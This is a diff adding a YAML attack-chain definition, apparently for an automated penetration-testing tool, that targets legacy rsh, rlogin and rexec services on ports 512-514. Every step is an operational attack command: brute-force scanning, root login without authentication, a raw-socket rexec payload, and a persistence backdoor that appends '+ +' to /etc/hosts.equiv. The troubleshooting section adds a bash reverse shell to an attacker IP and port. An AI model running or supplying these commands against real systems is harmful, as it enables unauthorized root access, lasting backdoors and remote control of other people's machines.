@@ -1,0 +1,72 @@
+chain_id: rsh_rlogin_rexec_weak_auth
+title: "rsh / rlogin / rexec (512-514) — trust-relationship abuse → root shell"
+severity: HIGH
+tags: [rservices, rsh, rlogin, rexec, legacy-protocols, metasploitable]
+
+trigger:
+  any_of:
+    - { service_pattern: "(?i)exec|login|shell|rsh|rlogin|rexec" }
+    - { port_in: [512, 513, 514] }
+
+description: |
+  Berkeley r-services — `rexec` (512), `rlogin` (513), `rshell` (514)
+  — predate strong authentication. They authenticate by source IP
+  + claimed username, with a global `/etc/hosts.equiv` or per-user
+  `~/.rhosts`. A line like `+ +` (any host, any user) lets ANY remote
+  user connect as ANY local user — including root. Metasploitable 2
+  has this; ancient HP-UX / Solaris boxes still found in industrial
+  environments.
+
+steps:
+  - id: 1
+    title: "Confirm services exposed"
+    command: |
+      nmap -sV -p 512,513,514 --script=rsh-brute $VICTIMA
+
+  - id: 2
+    title: "Try root login on rsh / rlogin"
+    command: |
+      apt install -y rsh-client
+      rsh -l root $VICTIMA id
+      rlogin -l root $VICTIMA
+
+  - id: 3
+    title: "Confirm trust file is wide open"
+    command: |
+      # Once you have any shell:
+      cat /etc/hosts.equiv
+      cat /root/.rhosts
+      # `+ +` or `+` alone = unauth-as-root from anywhere.
+
+  - id: 4
+    title: "rexec — explicit user/pass (often blank for service users)"
+    command: |
+      python3 - <<'PY'
+      import socket
+      s=socket.create_connection(("$VICTIMA",512))
+      s.sendall(b"\x00root\x00\x00id\x00")
+      print(s.recv(4096).decode())
+      PY
+
+  - id: 5
+    title: "Persistence — extend the trust file"
+    command: |
+      # In the rooted shell:
+      echo '+ +' >> /etc/hosts.equiv
+      # You now log in as any user, from any host, no auth.
+
+common_errors:
+  - error: "rsh: connection refused"
+    solution: |
+      Modern distros disable inetd entries for these. Check 22 / 23
+      instead — and if 22 is open with old OpenSSH, regreSSHion may
+      apply.
+  - error: "rsh works but command output is empty"
+    solution: |
+      Output buffering. Try `rsh root@$VICTIMA id 2>&1` or land an
+      explicit reverse shell:
+        rsh -l root $VICTIMA "bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'"
+
+references:
+  - https://en.wikipedia.org/wiki/Berkeley_r-commands
+  - https://book.hacktricks.xyz/network-services-pentesting/512-513-514
